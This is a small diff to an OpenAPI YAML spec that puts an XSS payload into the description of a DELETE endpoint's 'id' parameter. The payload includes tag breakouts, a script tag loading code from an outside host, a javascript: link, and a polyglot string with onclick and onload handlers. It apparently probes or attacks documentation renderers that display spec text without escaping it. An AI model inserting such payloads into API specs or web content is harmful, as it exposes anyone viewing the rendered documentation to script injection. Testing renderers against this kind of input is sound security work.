@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            "><h1>hacked <img on7med=k a7med=k>
+            "><h1>hacked <img on7med=k a7med=k><script src=g.com><a href=javascript:alert(8)>hh</a><input type="text" value="jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"></input>
           format: int64
           in: path
           name: id
